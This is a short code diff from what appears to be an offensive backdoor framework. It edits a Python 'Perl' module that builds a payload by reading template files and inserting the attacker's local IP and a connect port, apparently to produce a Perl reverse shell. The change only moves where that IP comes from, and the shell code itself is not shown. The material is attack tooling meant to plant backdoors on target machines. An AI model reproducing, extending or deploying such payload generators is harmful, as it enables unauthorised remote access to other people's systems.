@@ -3,12 +3,11 @@ from backdoor import *
 class Perl(Backdoor):
     prompt = Fore.RED + "(perl) " + Fore.BLUE + ">> " + Fore.RESET 
     
-    def __init__(self, target, core, ip):
+    def __init__(self, target, core):
         cmd.Cmd.__init__(self)
         self.intro = GOOD + "Using Perl module"
         self.target = target
         self.core = core
-	self.localIP = ip
         self.options = {
                 "port"   : Option("port", 53921, "port to connect to", True),
                 }
@@ -32,7 +31,7 @@ class Perl(Backdoor):
         with open ("perl/prs1", "r") as myfile:
             data=myfile.read()
         data = data[:-1]#remove the last new line character.
-        stringToAdd+=data + self.localIP
+        stringToAdd+=data + self.core.localIP
 
         with open ("perl/prs2", "r") as myfile:
             data=myfile.read()
